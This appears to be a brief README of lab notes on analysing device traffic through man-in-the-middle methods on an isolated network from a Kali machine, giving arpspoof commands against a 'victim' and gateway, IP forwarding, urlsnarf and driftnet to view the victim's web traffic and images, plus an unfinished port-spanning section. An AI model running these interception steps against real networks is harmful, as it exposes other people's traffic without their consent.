# Man-In-The-Middle attacks
We are analysising network traffic of specific devices using a few known methods. For all methods mentioned both the device being analyized and the analylisis tool are both on the same network preferablely both wired and on an isolated network. The tool is going to be a kali linux computer.

**Arp spoofing**
Follow the following commands.

Check you defualt gateway
`ip route`

Scan your network
`nmap -sP <YOUR_SUBNET>192.168.1.0/24`
-r is for range

Arpspoofing
`arpspoof -i <YOUR INTERFACE>eth0 -t <victim IP> -r <defualt gateway>`
`arpspoof -i <YOUR INTERFACE>eth0 -t <defualt gateway> -r <victim IP>`

ip forwarding
`echo 1 > /proc/sys/net/ipv4/ip_forward`

checking packet capture
`urlsnarf -i eth0` 
Victim http traffic will populate in output

`driftnet -i eth0`
Victim images in thier brower is displayed

After you confirm you are connected up, run wireshark to create your capture.

**Port Spanning
This will work for most cisco switched.
inetsim


## Wireshark filters
!dns.qry.name contains "openwrt.pool.ntp.org" and ip.src==10.0.0.2

